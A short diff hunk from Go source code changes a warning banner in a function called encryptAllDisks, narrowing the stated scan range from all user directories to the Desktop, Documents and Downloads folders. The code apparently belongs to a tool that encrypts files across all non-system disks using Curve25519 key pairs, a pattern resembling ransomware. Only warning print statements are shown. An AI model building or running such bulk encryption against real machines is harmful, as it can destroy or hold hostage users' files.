@@ -774,7 +774,7 @@ func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKe
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("SCAN RANGE:")
 	utils.PrintWarning("  - All disks except C:\\: %v", disks)
-	utils.PrintWarning("  - All user directories: C:\\Users\\*\\")
+	utils.PrintWarning("  - C:\\Users\\*\\Desktop, C:\\Users\\*\\Documents, C:\\Users\\*\\Downloads")
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("WARNING: This will encrypt files across ALL disks!")
 	utils.PrintWarning("Only files matching --include patterns will be encrypted.")
